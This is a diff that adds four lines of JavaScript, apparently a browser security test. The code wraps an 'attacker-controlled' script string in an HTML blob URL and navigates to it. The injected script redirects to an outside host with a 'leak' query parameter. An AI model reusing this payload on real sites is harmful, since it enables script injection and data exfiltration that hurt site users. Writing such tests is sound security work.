@@ -1,0 +1,4 @@
+var attackerControlledString = "<script>document.location='https://adition.com/report/?leak=c894228'<\/script>";
+var blob = new Blob([attackerControlledString], {type : 'text/html'});
+var url = webkitURL.createObjectURL(blob);
+location.href=url;
